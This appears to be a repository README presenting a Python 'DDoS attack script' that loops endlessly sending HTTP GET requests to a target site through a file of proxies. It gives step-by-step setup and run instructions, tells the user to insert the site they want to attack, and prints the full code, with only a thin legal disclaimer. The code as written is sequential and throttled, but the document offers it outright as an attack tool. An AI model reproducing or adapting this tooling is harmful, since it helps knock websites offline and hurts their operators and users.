# DDoS Attack Script Using Proxies

This Python script allows you to send HTTP requests through a list of proxy servers for the purpose of conducting DDoS attacks. It is designed to overload target websites by using multiple proxies to distribute the load.

## Features

- Loads a list of proxies from a specified file.
- Sends HTTP GET requests to a target URL using each proxy.
- Handles proxy errors and request exceptions.
- Displays the response from the target site.

## Requirements

- Python 3.x
- `requests` library

You can install the `requests` library using pip:

```bash
pip install requests

Usage
Clone the repository or download the script file.
Prepare your proxy list: Create a text file named proxy.txt in the same directory as the script. Each line should contain a proxy in the format IP:PORT, for example:
text
192.168.1.1:8080
192.168.1.2:8080

Edit the script: Open the script and replace URL_TARGET_SITE with the URL of the site you want to attack.
Run the script: Execute the script using Python:
bash
python your_script_name.py

Make sure to replace your_script_name.py with the actual name of your Python file.
Example Code
python
import requests
import time

def load_proxies(file_path):
    with open(file_path, "r") as file:
        proxies = file.readlines()
    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
    return proxies

def fetch_with_proxy(url, proxy):
    proxy_ip, proxy_port = proxy.split(":")
    proxies = {
        "http": f"http://{proxy_ip}:{proxy_port}",
        "https": f"http://{proxy_ip}:{proxy_port}",
    }

    try:
        response = requests.get(url, proxies=proxies, timeout=10)
        if response.status_code == 200:
            print(f"Successfully accessed the site through proxy: {proxy}")
            print("Site response:")
            print(response.text[:500])  
        else:
            print(f"Failed to access the site through proxy {proxy}. Status code: {response.status_code}")
    except requests.exceptions.ProxyError:
        print(f"Proxy error: {proxy}")
    except requests.exceptions.RequestException as e:
        print(f"Request error through proxy {proxy}: {e}")

def main(url, proxy_file):
    proxies = load_proxies(proxy_file)
    while True:
        for proxy in proxies:
            fetch_with_proxy(url, proxy)
            time.sleep(1)

url = "URL_TARGET_SITE"   # Target site URL
proxy_file = "proxy.txt"  # Your proxy list

main(url, proxy_file)

Important Notes
Legal Disclaimer: Ensure that you have permission to conduct DDoS attacks on the target website. Unauthorized use may violate terms of service or local laws and could lead to criminal charges.
Proxy Reliability: The effectiveness of this script depends on the reliability of the proxies used. Some proxies may be slow or unresponsive.
Rate Limiting: Be cautious with how frequently you send requests, as this may lead to your IP being blocked by the target site.
